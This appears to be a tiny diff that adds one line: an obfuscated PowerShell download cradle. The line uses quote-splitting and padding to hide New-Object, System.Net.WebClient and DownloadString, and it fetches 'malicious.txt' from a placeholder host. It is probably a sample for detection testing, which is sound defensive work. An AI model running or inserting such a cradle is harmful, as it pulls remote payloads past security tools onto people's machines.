@@ -1,0 +1,1 @@
+powershell.exe -C (New-O"bj"ect     S"yst"em."Net".W"eb"client)."Down"load"String"(remote.url/malicious.txt)
